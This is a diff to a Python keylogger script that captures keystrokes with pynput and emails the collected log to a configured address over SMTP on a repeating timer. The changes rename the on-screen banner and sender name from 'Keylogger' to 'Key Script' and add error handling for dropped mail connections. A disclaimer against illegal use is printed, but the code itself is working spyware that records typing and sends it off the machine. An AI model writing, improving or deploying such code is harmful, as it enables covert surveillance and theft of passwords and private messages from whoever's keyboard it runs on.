@@ -1,3 +1,4 @@
+from asyncio import sleep
 from click import style
 from pynput.keyboard import Listener
 from threading import Timer
@@ -12,11 +13,13 @@ import signal
 import sys
 import time
 
-exec_time_start = time.time()
+EXEC_TIME_START = time.time()
+
+ERROR_COUNTER = 0
 
 def sigint_handler(signal, frame):
-    exec_time_end = time.time()
-    total = round(exec_time_end - exec_time_start, 1)
+    EXEC_TIME_END = time.time()
+    total = round(EXEC_TIME_END - EXEC_TIME_START, 1)
     print (Fore.RED + '\n\nProcess terminated [0]' + Style.RESET_ALL + ' - Execution time: ' + str(total) + " seconds\n")
     sys.exit(0)
 
@@ -25,7 +28,7 @@ signal.signal(signal.SIGINT, sigint_handler)
 init(autoreset=True)
 
 print("\n")
-cprint(figlet_format('KEYLOGGER', font='slant'))
+cprint(figlet_format('KEYSCRIPT', font='slant'))
 
 disclaimer = """Do not attempt to violate the law. 
 If you planned to use the content for illegal purpose, 
@@ -51,9 +54,9 @@ while flag is False:
 
 now = datetime.now()
 
-msg = """ From: Keylogger Script
+msg = """ From: Key Script
 To: """ + EMAIL_ADDRESS + """
-Subject: Keylogger Log Mail Content
+Subject: Keylogger Mail Content
 
 """ + str(disclaimer).upper() + """
 
@@ -74,9 +77,13 @@ def on_press(key):
 
 def send():
     global msg
-    if len(msg)>0: 
-        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg)
-        print("[ - ] " + str(datetime.now()) + ": Message Send!\n")
+    if len(msg)>0:
+        try:
+            server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg)
+            print("[ - ] " + str(datetime.now()) + ": Message Send!\n")
+        except smtplib.SMTPServerDisconnected:
+            print("[ "+ Fore.RED + "ERROR" + Style.RESET_ALL + " ] Connection unexpectedly closed...\n")
+            exit()
     t1 = Timer(TIME, send)
     t1.daemon = True
     t1.start()
